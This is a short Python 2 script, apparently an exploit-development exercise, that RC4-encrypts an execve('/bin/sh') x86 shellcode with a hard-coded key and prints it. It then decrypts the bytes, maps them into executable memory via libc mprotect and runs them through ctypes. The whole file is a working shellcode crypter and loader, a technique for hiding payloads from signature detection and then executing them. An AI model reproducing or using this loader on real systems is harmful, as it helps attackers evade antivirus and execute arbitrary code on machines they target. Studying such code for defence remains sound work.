#!/usr/bin/python
from Crypto.Cipher import ARC4
from ctypes import *



# shellcode to give /bin/sh using execve sys call
shell_code = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

#i want to display the encrypted and decrypted shellcode in hex format so created a function 
def out_shellcodeformat(shell_code):
        encoded = ""
        for x in bytearray(shell_code):
                
                encoded += '\\x'
                encoded += '%02x' % x
        print (encoded)

#Key used to encrypt shellcode
e = ARC4.new('1234567890')

# Key used to decrypt shellcode
d = ARC4.new('1234567890')

enc_text = e.encrypt(shell_code)

print "[+]Encrypted text:", out_shellcodeformat(enc_text)

decrypted_text = d.decrypt(enc_text)

print "[+]Decrypted text:", out_shellcodeformat(decrypted_text)

libc = CDLL('libc.so.6')  
sc = c_char_p(decrypted_text)	
size = len(decrypted_text)
print "[+]Length of decrypted shellcode:", size
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
